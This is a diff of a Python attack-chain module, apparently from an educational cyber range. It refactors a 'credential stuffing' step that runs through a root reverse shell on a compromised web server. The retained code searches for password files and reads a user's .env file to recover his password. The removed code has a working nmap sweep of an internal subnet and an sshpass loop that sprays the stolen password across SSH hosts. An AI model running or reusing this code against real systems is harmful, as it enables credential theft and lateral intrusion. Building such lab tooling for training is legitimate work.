@@ -6,29 +6,18 @@ import time
 from chainlog import log
 
 # =============================================================================
-# credential_stuffing.py — Discover internal SSH hosts + spray john's password
+# credential_stuffing.py — Discover internal credentials from john's .env
 # MITRE ATT&CK:
 #   T1552.001 – Credentials In Files     (read john's ~/.env on apache)
-#   T1018     – Remote System Discovery  (nmap sweep of internal_net)
-#   T1046     – Network Service Discovery (ssh service enumeration)
-#   T1110.004 – Brute Force: Credential Stuffing  (reuse john's password)
-#   T1021.004 – Remote Services: SSH      (the auth vector)
 # -----------------------------------------------------------------------------
-# Runs FROM apache via the root reverse shell — the only egress point that
-# reaches internal_net :22 (router FORWARD drops External→Internal SSH;
-# DMZ→Internal SSH is allowed).
-#
-# The educator-facing "what a pentester actually types" is `nxc ssh` from kali
-# (netexec is installed in the kali image). The orchestrator can't use it
-# end-to-end because of the router rules, so it emulates the same TTP shape
-# with nmap + sshpass executed inside apache. See Documentation/attack_plan.md.
+# Runs FROM apache via the root reverse shell.
+# Searches for common sensitive file patterns (noise) then reads john's ~/.env
+# file to recover his password.  Network discovery and credential stuffing are
+# handled in lateral_movement.py.
 # =============================================================================
 
-ENV_FILE_PATH    = "/home/john.stravidis/.env"
-INTERNAL_SUBNET  = "10.30.0.0/24"
-TARGET_USERNAME  = "john.stravidis"
-SSH_PORT         = 22
-SCAN_OUTPUT_FILE = "/tmp/cs-scan.gnmap"
+ENV_FILE_PATH   = "/home/john.stravidis/.env"
+TARGET_USERNAME = "john.stravidis"
 
 # Noise file patterns searched before the real .env read (T1552.001).
 # Each tuple is (filename, list_of_dirs_to_search).  All searches are
@@ -42,15 +31,6 @@ _NOISE_FILE_PATTERNS = [
     (".passwd",         ["/home", "/root",                     "/opt"]),
     ("db_password.txt", ["/home", "/root",                     "/opt"]),
 ]
-
-# Hosts to exclude from the spray attempt — pure infrastructure addresses
-# that would noise up the log without ever serving sshd-on-22 for `john`:
-#   .1   bridge gateway
-#   .2   apache itself (we're already root here)
-#   .3   router's public leg
-#   .4   router's internal leg
-#   .6   db-internal (postgres only, no sshd)
-_SKIP_HOSTS = {"10.30.0.1", "10.30.0.2", "10.30.0.3", "10.30.0.4", "10.30.0.6"}
 
 
 _sentinel_seq = 0
@@ -149,31 +129,18 @@ def _search_noise_files(shell):
         log("[*] Noise search complete — no additional credential files discovered")
 
 
-def _parse_gnmap_hosts(gnmap_text):
-    """Return a list of IPs whose grepable-nmap line shows port 22/open."""
-    hosts = []
-    for line in gnmap_text.splitlines():
-        if not line.startswith("Host:"):
-            continue
-        if "22/open" not in line:
-            continue
-        m = re.search(r"Host:\s+(\S+)", line)
-        if m:
-            hosts.append(m.group(1))
-    return hosts
-
-
-def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
+def run(root_shell, target_user=TARGET_USERNAME):
     """
-    Execute the credential-stuffing step on apache via the root shell.
+    Execute the credential-discovery step on apache via the root shell.
+
+    Searches for sensitive file patterns (noise) then reads john's .env file
+    to recover his password.  Network discovery and credential stuffing against
+    internal hosts are handled by the lateral movement step.
 
     Returns a dict with:
-        john_ip       — host the credentials worked on (or None)
-        john_password — the password recovered from the env file
-        scanned_hosts — list of internal hosts found with open :22
-        successes     — list of (host, user) pairs sshpass authenticated to
+        john_password — the password recovered from the env file (or None)
     """
-    log("\n[*] Starting credential stuffing (host discovery + password spray)...")
+    log("\n[*] Starting credential discovery...")
 
     # ------------------------------------------------------------------
     # Phase 1 — Credentials in files (T1552.001)
@@ -186,73 +153,10 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
     if not password:
         log(f"[-] No usable password variable found in {ENV_FILE_PATH}")
         log(f"[?] File contents: {env_blob!r}")
-        return {"john_ip": None, "john_password": None, "scanned_hosts": [], "successes": []}
+        return {"john_password": None}
     log(f"[+] Recovered credential: {target_user} / {password}")
 
-    # ------------------------------------------------------------------
-    # Phase 2 — Network discovery (T1018 / T1046)
-    # ------------------------------------------------------------------
-    log(f"[*] Scanning {subnet} for live SSH hosts (nmap from apache)...")
-    scan_cmd = (
-        f"nmap -Pn -n -p {SSH_PORT} --open "
-        f"-oG {SCAN_OUTPUT_FILE} {subnet} >/dev/null && "
-        f"cat {SCAN_OUTPUT_FILE}"
-    )
-    scan_out = _run_remote(root_shell, scan_cmd, timeout=60)
-    discovered = [ip for ip in _parse_gnmap_hosts(scan_out) if ip not in _SKIP_HOSTS]
-    if not discovered:
-        log(f"[-] No SSH hosts discovered on {subnet}")
-        _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
-        return {"john_ip": None, "john_password": password, "scanned_hosts": [], "successes": []}
-    log(f"[+] Discovered {len(discovered)} live SSH host(s): {', '.join(discovered)}")
-
-    # ------------------------------------------------------------------
-    # Phase 3 — Credential stuffing (T1110.004 / T1021.004)
-    # ------------------------------------------------------------------
-    log(f"[*] Spraying {target_user} credentials across {len(discovered)} host(s)...")
-    successes = []
-    for host in discovered:
-        attempt = (
-            f"sshpass -p {shlex.quote(password)} ssh "
-            f"-o StrictHostKeyChecking=accept-new "
-            f"-o UserKnownHostsFile=/dev/null "
-            f"-o PasswordAuthentication=yes "
-            f"-o PubkeyAuthentication=no "
-            f"-o PreferredAuthentications=password "
-            f"-o ConnectTimeout=5 "
-            f"-o NumberOfPasswordPrompts=1 "
-            f"-p {SSH_PORT} "
-            f"{target_user}@{host} id"
-        )
-        out = _run_remote(root_shell, attempt, timeout=15)
-        if "uid=" in out and target_user in out:
-            log(f"[+] {host:<14} {target_user}:{password}  → AUTH OK")
-            successes.append((host, target_user))
-        else:
-            log(f"[-] {host:<14} {target_user}:{password}  → denied")
-
-    # ------------------------------------------------------------------
-    # Phase 4 — Cleanup + return
-    # ------------------------------------------------------------------
-    _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
-
-    if not successes:
-        log("[-] Credential stuffing did not authenticate on any host")
-        return {
-            "john_ip": None,
-            "john_password": password,
-            "scanned_hosts": discovered,
-            "successes": [],
-        }
-
-    john_ip = successes[0][0]
-    log(f"[+] Credential stuffing successful! {target_user} reachable at {john_ip}")
-    return {
-        "john_ip": john_ip,
-        "john_password": password,
-        "scanned_hosts": discovered,
-        "successes": successes,
-    }
+    return {"john_password": password}
 
 
 # Test mode — same pattern as the other chain modules.
